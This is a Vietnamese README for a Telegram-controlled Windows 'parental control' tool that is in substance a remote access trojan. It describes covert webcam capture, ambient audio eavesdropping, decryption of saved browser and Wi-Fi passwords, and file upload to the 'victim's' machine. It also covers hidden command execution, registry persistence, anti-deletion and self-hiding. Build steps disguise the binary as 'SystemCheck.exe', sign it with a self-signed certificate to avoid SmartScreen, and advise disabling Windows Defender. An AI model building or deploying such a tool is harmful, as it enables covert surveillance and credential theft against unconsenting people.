-----

# 🛡️ MONITOR V10 - PARENTAL CONTROL TOOL - PERSONAL SYSTEM ADMINISTRATION

> **Developer:** TsByin  
> **Version:** 2.0 (Refactored & Optimized)

Công cụ quản lý và giám sát máy tính từ xa qua Telegram Bot. Phiên bản V10 tích hợp các tính năng bảo mật nâng cao, chặn ứng dụng/web thông minh và cơ chế tự bảo vệ.

> **⚠️ LƯU Ý PHÁP LÝ:** Công cụ này được thiết kế cho mục đích **Quản lý con cái** hoặc **Quản trị hệ thống cá nhân**. Việc sử dụng công cụ này để theo dõi máy tính của người khác mà không có sự đồng ý là vi phạm pháp luật. Tác giả không chịu trách nhiệm về bất kỳ hành vi sử dụng sai mục đích nào.

---

## 📁 CẤU TRÚC DỰ ÁN 

```
V10/
├── Core Modules (7 files)
│   ├── V10.py          - Main bot (866 lines) ⭐
│   ├── config.py       - Configuration & logging
│   ├── utils.py        - System utilities
│   ├── grabber.py      - Password extraction (concurrent)
│   ├── media.py        - Screen/webcam/audio capture
│   ├── monitor.py      - Background monitoring daemon
│   └── verify_setup.py - Setup verification
│
├── Configuration
│   ├── .env            - Tokens & settings (MUST CREATE)
│   └── requirements.txt - Dependencies
│
└── Documentation
    ├── README.md       - This file
    ├── ARCHITECTURE.md - System architecture
    ├── LOGIC_FLOWS.md  - Detailed flow diagrams
    ├── QUICK_START.md  - Quick setup guide
    └── BUILD_EXE.md    - EXE build instructions
```

**Key Improvements (V10):**
- ✅ Modular architecture (7 independent modules)
- ✅ Secure .env configuration (no hardcoded tokens)
- ✅ Concurrent password extraction (2-3x faster)
- ✅ Background monitoring thread with debounced alerts
- ✅ Comprehensive logging system
- ✅ Proper resource cleanup

-----

## ✨ TÍNH NĂNG CHÍNH

### 1\. 📡 Giám Sát & Theo Dõi (Real-time)

  * **📸 Webcam:** Chụp ảnh bí mật từ camera trước.
  * **🖼 Chụp Màn Hình:** Chụp ảnh màn hình (nén thông minh gửi nhanh).
  * **🎥 Quay Màn Hình:** Quay video hoạt động trong 10 giây.
  * **🎤 Ghi Âm:** Nghe lén môi trường xung quanh (10 giây).
  * **⚙️ Quản lý Tiến trình:** Xem và Tắt (Kill) các ứng dụng đang chạy.

### 2\. 🚫 Kiểm Soát & Chặn (Control)

  * **Chặn Web:** Chặn truy cập web (Facebook, YouTube...) bằng file Hosts + Flush DNS.
  * **Chặn App:** Tự động tắt ứng dụng/game trong danh sách đen.
  * **Khóa Input:** Khóa bàn phím và chuột từ xa.
  * **Khóa Task Manager:** Ngăn chặn mở Trình quản lý tác vụ.
  * **Nguồn:** Tắt máy, Khởi động lại từ xa.

### 3\. 📂 Dữ Liệu & Tệp Tin (Grabber & Explorer)

  * **Lấy Mật Khẩu:** Giải mã mật khẩu lưu trên trình duyệt (Chrome, Edge, Cốc Cốc...).
  * **Lịch Sử Web:** Xem lịch sử truy cập của từng trình duyệt.
  * **Wi-Fi:** Xem danh sách và mật khẩu Wifi đã lưu.
  * **File Explorer:** Duyệt, Tải về và Upload file lên máy tính nạn nhân.

### 4\. 🛡️ Cơ Chế Tự Vệ (Stealth & Defense)

  * **Persistence:** Tự động khởi động cùng Windows (Registry).
  * **Anti-Delete:** Chống xóa thư mục bot bằng quyền NTFS (Access Denied).
  * **Self-Defense:** Tự động đóng cửa sổ thư mục nếu bị người dùng tìm thấy.
  * **Auto-Reconnect:** Tự động kết nối lại khi mất mạng.

-----

## 🛠️ YÊU CẦU HỆ THỐNG

  * **OS:** Windows 10/11 (64-bit).
  * **Python:** 3.8 trở lên.
  * **Quyền:** Administrator (Bắt buộc để chặn Web và ghi Registry).

-----

## 🚀 CÀI ĐẶT MÔI TRƯỜNG (Dev)

Chạy lần lượt các lệnh sau trong CMD để cài đặt thư viện:

```bash
# 1. Cài đặt công cụ hỗ trợ binary
pip install pipwin

# 2. Cài đặt thư viện âm thanh (Thường hay lỗi nếu cài thường)
pipwin install pyaudio

# 3. Cài đặt các thư viện còn lại từ file requirements
pip install -r requirements.txt
```

-----

## ⚙️ CẤU HÌNH (Config)

Cấu hình được quản lý thông qua file `.env` (an toàn hơn):

### Bước 1: Tạo file `.env`

Tạo file `.env` trong thư mục gốc (cùng với V10.py):

```bash
API_TOKEN=YOUR_TELEGRAM_BOT_TOKEN
ADMIN_ID=123456789
MONITOR_INTERVAL=1
CPU_ALERT_THRESHOLD=95
CPU_ALERT_COOLDOWN=300
MOTION_DETECT_AREA=3000
```

### Bước 2: Lấy Telegram Token & Admin ID

1. **Token:** Nhắn `/newbot` cho @BotFather trên Telegram
2. **Admin ID:** Nhắn `/start` cho @userinfobot để lấy ID của bạn

### Bước 3: Xác minh Config

Chạy lệnh kiểm tra:

```bash
python -c "from config import API_TOKEN, ADMIN_ID; print(f'✅ Config OK - Token: {API_TOKEN[:10]}..., Admin: {ADMIN_ID}')"
```

-----

## 📦 ĐÓNG GÓI & TRIỂN KHAI (Build EXE)

### Bước 1: Chuẩn bị file .env

Đảm bảo file `.env` có đầy đủ cấu hình (xem mục Config ở trên).

### Bước 2: Build file EXE

Sử dụng PyInstaller để đóng gói thành 1 file duy nhất, chạy ngầm:

```bash
pyinstaller --onefile --noconsole --uac-admin --icon=icon.ico --name="SystemCheck" V10.py
```*File kết quả sẽ nằm trong thư mục `dist/SystemCheck.exe`.*

**Lưu ý:** File `.env` phải ở cùng thư mục với `SystemCheck.exe`

### Bước 3: Ký Chữ Ký Số (Code Signing) - Optional

Chạy **PowerShell (Admin)** để ký file giúp tránh màn hình xanh SmartScreen.

```powershell
# 1. Tạo chứng chỉ (Nếu chưa có)
$cert = New-SelfSignedCertificate -DnsName "SystemCheck" -CertStoreLocation "Cert:\CurrentUser\My" -Type CodeSigningCert
# Trust chứng chỉ
$rootStore = New-Object System.Security.Cryptography.X509Certificates.X509Store([System.Security.Cryptography.X509Certificates.StoreName]::Root, "CurrentUser")
$rootStore.Open("ReadWrite"); $rootStore.Add($cert); $rootStore.Close()

# 2. Ký vào file EXE
Set-AuthenticodeSignature -Certificate $cert -FilePath "dist\SystemCheck.exe"

# 3. Xuất file chứng chỉ (Để cài sang máy khác)
Export-Certificate -Cert $cert -FilePath "dist\Cert.cer"
```

-----

## 📖 HƯỚNG DẪN SỬ DỤNG (Telegram)

### Các lệnh Chat:

| Lệnh | Mô tả |
| :--- | :--- |
| `/start` | Mở Menu điều khiển chính (Nút bấm). |
| `/help` | Xem hướng dẫn chi tiết. |
| `/block app <tên.exe>` | Thêm ứng dụng vào danh sách chặn. |
| `/block site <domain>` | Thêm web vào danh sách chặn. |
| `/unblock ...` | Xóa khỏi danh sách chặn. |
| `/msg <nội dung>` | Hiện thông báo nổi trên màn hình máy tính. |
| `/say <nội dung>` | Máy tính phát ra giọng nói (Tiếng Anh). |
| `/cmd <lệnh>` | Chạy lệnh CMD ngầm (VD: `/cmd ipconfig`). |

### Chặn Settings & Control Panel:

Để chặn người dùng gỡ cài đặt hoặc chỉnh hệ thống, hãy dùng lệnh:

1.  `/block app SystemSettings.exe` (Chặn Cài đặt)
2.  `/block app control.exe` (Chặn Control Panel)
3.  Bấm nút **🚫 Chặn App/Web** để kích hoạt.

-----

## ❓ XỬ LÝ SỰ CỐ (Troubleshooting)

**1. Bot không online?**

  * Kiểm tra mạng máy tính.
  * Kiểm tra file `.env` có đầy đủ `API_TOKEN` và `ADMIN_ID`.
  * Nếu chạy bản EXE, đảm bảo file `.env` ở cùng thư mục với `SystemCheck.exe`.
  * Tắt Windows Defender hoặc thêm thư mục vào Exclusion.

**2. Lỗi "API_TOKEN not found"?**

  * Kiểm tra file `.env` có tồn tại và đúng tên.
  * Đảm bảo không có ký tự thừa hoặc dòng trống sau giá trị.
  * Chạy lệnh kiểm tra config (xem mục Config)

**3. Không chặn được Web?**

  * Bot phải được chạy với quyền **Administrator**.
  * Một số trình duyệt dùng *Secure DNS (DoH)*, hãy vào cài đặt trình duyệt tắt nó đi nếu cần thiết.

**4. Không thể xóa/update file EXE?**

  * Do cơ chế bảo vệ thư mục đang bật.
  * **Cách sửa:** Dùng Bot gửi lệnh CMD:
    `/cmd icacls "%APPDATA%\Microsoft\Windows\SystemMonitor" /reset /T`
    Sau đó dùng `/cmd taskkill /f /im SystemCheck.exe` để tắt bot rồi mới xóa được.